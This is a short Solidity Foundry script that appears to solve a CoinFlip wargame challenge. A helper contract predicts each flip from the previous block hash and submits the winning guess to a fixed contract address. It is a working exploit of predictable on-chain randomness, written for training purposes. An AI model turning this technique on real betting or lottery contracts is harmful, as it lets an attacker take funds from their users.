// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Player {
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinflipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint coinflip = blockValue / factor;
        bool guess = coinflip == 1 ? true : false;
        _coinflipInstance.flip(guess);
    }
}

contract CoinFlipSolution is Script {

    CoinFlip public coinflipInstance = CoinFlip(0x8877DC03F29a1329c0E0aa592c344eBe6fa19A0F);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("Wins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();

    }
}